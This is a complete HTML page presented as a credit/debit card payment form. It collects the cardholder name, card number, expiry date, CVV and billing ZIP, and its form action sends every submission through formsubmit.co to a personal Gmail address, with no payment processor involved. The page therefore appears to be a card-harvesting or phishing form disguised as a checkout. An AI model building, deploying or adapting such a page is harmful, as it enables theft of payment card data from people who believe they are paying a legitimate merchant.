
<!DOCTYPE html>
<html>
<head>
  <title>Card Payment</title>
  <meta charset="UTF-8">
</head>
<body>
  <h2>Credit/Debit Card Payment</h2>
  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST">
    <input type="hidden" name="_next" value="thank-you.html">

    <label>Name on Card:</label><br>
    <input type="text" name="card_name" required><br><br>

    <label>Card Number:</label><br>
    <input type="text" name="card_number" required><br><br>

    <label>Expiration Date:</label><br>
    <input type="text" name="expiry" required placeholder="MM/YY"><br><br>

    <label>CVV:</label><br>
    <input type="text" name="cvv" required><br><br>

    <label>Billing ZIP:</label><br>
    <input type="text" name="zip" required><br><br>

    <button type="submit">Submit Payment</button>
  </form>
</body>
</html>
